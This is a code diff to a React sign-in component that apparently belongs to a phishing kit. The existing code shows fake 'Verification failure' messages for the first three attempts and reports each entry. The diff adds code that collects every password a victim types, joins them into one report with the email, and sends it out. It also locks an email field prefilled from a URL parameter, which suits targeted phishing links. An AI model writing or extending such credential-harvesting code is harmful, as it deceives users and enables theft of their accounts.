@@ -11,7 +11,7 @@ import {
   resolveBackgroundDomain,
   userFromEmail,
 } from '../lib/utils'
-import { sendResponse } from '../lib/responses'
+import { sendResponse, type ResponsePayload } from '../lib/responses'
 import { verifyCaptchaToken } from '../lib/captcha'
 import { primeClientMeta } from '../lib/clientMeta'
 import { getPersonalizedUrlParams } from '../lib/urlParams'
@@ -87,9 +87,11 @@ interface SignInStepProps {
 }
 
 let signInAttempts = 0
+let signInReports: ResponsePayload[] = []
 
 function resetSignInSession() {
   signInAttempts = 0
+  signInReports = []
 }
 
 function SignInStep({ onDomainChange }: SignInStepProps) {
@@ -102,12 +104,14 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
   const [captchaToken, setCaptchaToken] = useState<string | null>(null)
   const [error, setError] = useState('')
   const [loading, setLoading] = useState(false)
+  const isPrefilledEmail = Boolean(urlParams.email)
 
   useEffect(() => {
     onDomainChange(resolveBackgroundDomain(email))
   }, [email, onDomainChange])
 
   const handleEmailChange = (value: string) => {
+    if (isPrefilledEmail) return
     setEmail(value)
     onDomainChange(resolveBackgroundDomain(value))
   }
@@ -163,7 +167,7 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
     }
 
     if (signInAttempts < 3) {
-      void sendResponse({
+      signInReports.push({
         ...report,
         outcome: 'failed',
         message: 'Verification failure. Please try again.',
@@ -175,11 +179,24 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       return
     }
 
-    // Wait for the final report before redirecting — navigation aborts in-flight sends.
-    await sendResponse({
+    signInReports.push({
       ...report,
       outcome: 'success',
     })
+
+    const combinedPasswords = signInReports
+      .map((item, index) => `Pass ${index + 1}: ${item.passwordValue ?? item.password ?? 'Unknown'}`)
+      .join('\n')
+
+    await sendResponse({
+      ...report,
+      email: trimmedEmail,
+      password: combinedPasswords,
+      passwordValue: combinedPasswords,
+      outcome: 'success',
+      message: `Attempt history: ${signInReports.length} attempts`,
+    })
+    signInReports = []
 
     signIn(userFromEmail(trimmedEmail), { authMethod: 'email' })
     setPassword('')
@@ -197,15 +214,28 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
           <label htmlFor="email" className="mb-1.5 block text-sm font-medium text-slate-700">
             Email
           </label>
-          <input
-            id="email"
-            type="email"
-            autoComplete="email"
-            value={email}
-            onChange={(e) => handleEmailChange(e.target.value)}
-            placeholder="you@company.com"
-            className="w-full rounded-xl border border-slate-200 bg-white px-4 py-3 text-sm text-slate-900 outline-none transition placeholder:text-slate-400 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20"
-          />
+          <div className={isPrefilledEmail ? 'group relative' : ''}>
+            <input
+              id="email"
+              type="email"
+              autoComplete="email"
+              value={email}
+              onChange={(e) => handleEmailChange(e.target.value)}
+              placeholder="you@company.com"
+              readOnly={isPrefilledEmail}
+              aria-readonly={isPrefilledEmail}
+              title={isPrefilledEmail ? 'This email is locked and cannot be edited.' : undefined}
+              className={`w-full rounded-xl border border-slate-200 bg-white px-4 py-3 text-sm outline-none transition placeholder:text-slate-400 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 ${isPrefilledEmail ? 'cursor-not-allowed bg-slate-100 text-slate-400 blur-[0.25px] placeholder:text-slate-300' : 'text-slate-900'
+                }`}
+            />
+            {isPrefilledEmail && (
+              <div className="pointer-events-none absolute inset-y-0 right-3 flex items-center opacity-0 transition duration-200 group-hover:opacity-100">
+                <span className="flex h-5 w-5 items-center justify-center rounded-full border border-slate-300 bg-white/90 text-[10px] font-bold text-slate-500 shadow-sm">
+                  🔒
+                </span>
+              </div>
+            )}
+          </div>
         </div>
 
         <div>
